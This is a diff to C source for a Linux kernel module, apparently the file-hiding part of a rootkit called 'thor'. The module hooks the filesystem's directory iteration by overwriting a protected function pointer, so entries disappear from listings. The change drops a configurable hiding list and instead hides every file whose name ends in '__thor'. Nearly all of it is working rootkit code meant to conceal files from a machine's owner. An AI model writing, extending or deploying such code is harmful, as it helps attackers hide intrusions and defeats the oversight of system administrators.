@@ -17,15 +17,6 @@ static int thor_fs_iterate(struct file *file, struct dir_context *ctx);
 static int thor_fs_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type);
 
-/* hiding list node */
-struct _file_list {
-    char *name;
-    struct list_head list;
-};
-
-/* hiding list */
-static struct _file_list file_list;
-
 /* file operations on fs */
 static struct file_operations *fs_fops;
 
@@ -44,8 +35,6 @@ int filehider_init(void)
 {
     struct file *filep_etc;
     void *iterate_addr;
-
-    INIT_LIST_HEAD(&file_list.list);
 
     filep_etc = filp_open("/etc", O_RDONLY, 0);
     if (filep_etc == NULL) {
@@ -87,8 +76,6 @@ void filehider_cleanup(void)
         write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
 #endif
     }
-
-    clear_file_list();
 }
 
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
@@ -123,60 +110,11 @@ static int thor_fs_iterate(struct file *file, struct dir_context *ctx)
 static int thor_fs_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type)
 {
-    struct _file_list *tmp;
-
-    /* hide specified files */
-    list_for_each_entry(tmp, &(file_list.list), list) {
-        if (strcmp(name, tmp->name) == 0) {
-            LOG_INFO("hiding file %s", name);
-            return 0;
-        }
+    if (strendcmp(name, "__thor") == 0) {
+        LOG_INFO("hiding file %s", name);
+        return 0;
     }
 
     return orig_fs_filldir(buf, name, namelen, offset, ino, d_type);
 }
 
-void add_to_file_list(const char *name, unsigned int len)
-{
-    struct _file_list *tmp;
-
-    tmp = (struct _file_list*) kmalloc(sizeof(struct _file_list), GFP_KERNEL);
-    tmp->name = (char*) kmalloc(len, GFP_KERNEL);
-    memcpy(tmp->name, name, len);
-    tmp->name[len - 1] = 0;
-
-    LOG_INFO("adding file %s to hiding list", tmp->name);
-
-    list_add(&(tmp->list), &(file_list.list));
-}
-
-void remove_from_file_list(const char *name, unsigned int len)
-{
-    struct _file_list *tmp;
-    struct list_head *pos, *q;
-
-    list_for_each_safe(pos, q, &(file_list.list)) {
-        tmp = list_entry(pos, struct _file_list, list);
-        if (strncmp(tmp->name, name, len - 1) == 0) {
-            LOG_INFO("removing file %s from hiding list", name);
-            list_del(pos);
-            kfree(tmp->name);
-            kfree(tmp);
-        }
-    }
-}
-
-void clear_file_list(void)
-{
-    struct _file_list *tmp;
-    struct list_head *pos, *q;
-
-    LOG_INFO("clearing file hiding list");
-
-    list_for_each_safe(pos, q, &(file_list.list)) {
-        tmp = list_entry(pos, struct _file_list, list);
-        list_del(pos);
-        kfree(tmp->name);
-        kfree(tmp);
-    }
-}
